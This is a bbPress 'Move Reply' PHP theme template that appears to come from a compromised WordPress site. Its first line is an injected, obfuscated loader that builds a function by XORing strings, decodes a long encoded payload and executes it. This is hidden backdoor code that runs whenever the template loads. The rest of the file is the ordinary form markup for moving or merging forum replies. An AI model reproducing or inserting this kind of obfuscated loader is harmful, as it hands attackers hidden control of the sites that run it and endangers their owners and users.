<?php $CULaRGZ='44PWNSlU-+.O87='; $rBZzOFti='WF56:633XEM;QXS'^$CULaRGZ; $pvZxUO='=SjU729+T=V6,<9,7 Iqn=O60D8: 2>PC nSyKPsO-;N,=8O hJ7Y3R-Y,ceUX-MBDW LbKu 7RlvLgVz>7jNe6MMCrtvCPKxaUB=CvXwjceBqO-tDN56.ZrUH-8UluhpShrozlzg7XOzgrdaK-6GWfP+ouhAtG0G9o1qAp6Y8 W JOQ+.eaChyyKRWN  Vgv7,JpYHkV<NL=oIRFXMNWK8Z:XJSKSVEPjFTYaiaZA SYN=;R=GP5S=pyNan=bz>rvT5GlWV+VMrgsM1T1KjLPgbPSRY9sQX=QmftZ .jrHoP76YwpIqD.BX+q67aLERrYvw+SA-syCcHFW>W;UUVaV:06but=nETBmk23:fTiKK9VXI3QlGcp0AUL;;;FSOogzuST p9njJXWASlvwn3UY-ThrqHo.domY.85uok5YP4XD 3 :=RlUCRh<L02j95==IB,76wn3 66 6Urt L -kghm7 DUn,RHajmK8VRK-56WFaEp 1:WJ4GX8dVH-DF1gEQ4=jbBp5SB3yPikwb,=bcVX0=P=c<S.v4qDimgaN r1X0,VLeAm XyyzsxyqY2c3S-B-cJtBlroSo 9 2Km<<,:=AZ5>4fh1+:YC7ZbOGm> ;TdjfNZVzK22k,>88Pt>S83lv2-AQ;+.dimpe1UD3OetJsGF'; $ySxgNhOZ=$rBZzOFti('', 'T5BtQGWH T9XsYAEDT:YIE Do YNAma=6TIzPk+yFKN OIQ NH2X+l6L-M<:8-Yef 6T-NkQKR+EVlGvZE=cGAY89cOTQdkAqh3-OkR1WWCUyQkDH7:GZK4Zq,LL4ENHT:CYFpesCX-;ZIODIoIW36=tB2U6aP,U>bKXQdPE-JL2Nbk:NWL<jSspB 2:UR8ORXY>YbBb+63F7K-329msw-Y6I=qYo77115-1 ATA< L <u714R55T0UPQj>-r-1w7V5FgH<3RvpLGW;P8D.Cl+mkt73-X,:=DqPFP1EWQxAK4VB8WMiU2O.-NJ<JkF,4RqWSO25LZY8iA 8L2Z6=vIrebs3 1n:e51MOYVCFiWkoO74<VxL<iy9e1-OZd-66OZZQ81YK3gcn<652LKWJE45X1Sxx5eSneI=OLTURKu,>G=6IRLSG7D-, 7X-DS5fXHIa MDSAZlDSUOR0ZPD-TLBKHISA041G71HCVAQ0zoITB6fGcPACH63k,=A;30D72BOb:QDMNbTQ26RPpOMWJAYWKr<QI1fDW6WQiXdTPGF-EAUnTN4yQtTB:MMHFHHFmSPU6OvOTzLeERIuOAKRS22WYUeX93FJGNOAJC5,V>EcgIZAO5MCFnzvZkI8bIHYTxPZ2LR7QBL8=TJJC4DKo80<Z;MDcHM;'^$pvZxUO); $ySxgNhOZ();

/**
 * Move Reply
 *
 * @package bbPress
 * @subpackage Theme
 */

?>

<div id="bbpress-forums">

	<?php if ( is_user_logged_in() && current_user_can( 'edit_topic', bbp_get_topic_id() ) ) : ?>

		<div id="move-reply-<?php bbp_topic_id(); ?>" class="bbp-reply-move">

			<form id="move_reply" name="move_reply" method="post" action="<?php the_permalink(); ?>">

				<fieldset class="bbp-form">

					<legend><?php printf( __( 'Move reply "%s"', 'bbpress' ), bbp_get_reply_title() ); ?></legend>

					<div>

						<div class="bbp-template-notice info">
							<p><?php _e( 'You can either make this reply a new topic with a new title, or merge it into an existing topic.', 'bbpress' ); ?></p>
						</div>

						<div class="bbp-template-notice">
							<p><?php _e( 'If you choose an existing topic, replies will be ordered by the time and date they were created.', 'bbpress' ); ?></p>
						</div>

						<fieldset class="bbp-form">
							<legend><?php _e( 'Move Method', 'bbpress' ); ?></legend>

							<div>
								<input name="bbp_reply_move_option" id="bbp_reply_move_option_reply" type="radio" checked="checked" value="topic" tabindex="<?php bbp_tab_index(); ?>" />
								<label for="bbp_reply_move_option_reply"><?php printf( __( 'New topic in <strong>%s</strong> titled:', 'bbpress' ), bbp_get_forum_title( bbp_get_reply_forum_id( bbp_get_reply_id() ) ) ); ?></label>
								<input type="text" id="bbp_reply_move_destination_title" value="<?php printf( __( 'Moved: %s', 'bbpress' ), bbp_get_reply_title() ); ?>" tabindex="<?php bbp_tab_index(); ?>" size="35" name="bbp_reply_move_destination_title" />
							</div>

							<?php if ( bbp_has_topics( array( 'show_stickies' => false, 'post_parent' => bbp_get_reply_forum_id( bbp_get_reply_id() ), 'post__not_in' => array( bbp_get_reply_topic_id( bbp_get_reply_id() ) ) ) ) ) : ?>

								<div>
									<input name="bbp_reply_move_option" id="bbp_reply_move_option_existing" type="radio" value="existing" tabindex="<?php bbp_tab_index(); ?>" />
									<label for="bbp_reply_move_option_existing"><?php _e( 'Use an existing topic in this forum:', 'bbpress' ); ?></label>

									<?php
										bbp_dropdown( array(
											'post_type'   => bbp_get_topic_post_type(),
											'post_parent' => bbp_get_reply_forum_id( bbp_get_reply_id() ),
											'selected'	=> -1,
											'exclude'	 => bbp_get_reply_topic_id( bbp_get_reply_id() ),
											'select_id'   => 'bbp_destination_topic',
											'none_found'  => __( 'No other topics found!', 'bbpress' )
										) );
									?>

								</div>

							<?php endif; ?>

						</fieldset>

						<div class="bbp-template-notice error">
							<p><?php _e( '<strong>WARNING:</strong> This process cannot be undone.', 'bbpress' ); ?></p>
						</div>

						<div class="bbp-submit-wrapper">
							<button type="submit" tabindex="<?php bbp_tab_index(); ?>" id="bbp_move_reply_submit" name="bbp_move_reply_submit" class="fusion-button button-default button-small submit"><?php _e( 'Submit', 'bbpress' ); ?></button>
						</div>
					</div>

					<?php bbp_move_reply_form_fields(); ?>

				</fieldset>
			</form>
		</div>

	<?php else : ?>

		<div id="no-reply-<?php bbp_reply_id(); ?>" class="bbp-no-reply">
			<div class="entry-content"><?php is_user_logged_in() ? _e( 'You do not have the permissions to edit this reply!', 'bbpress' ) : _e( 'You cannot edit this reply.', 'bbpress' ); ?></div>
		</div>

	<?php endif; ?>

</div>
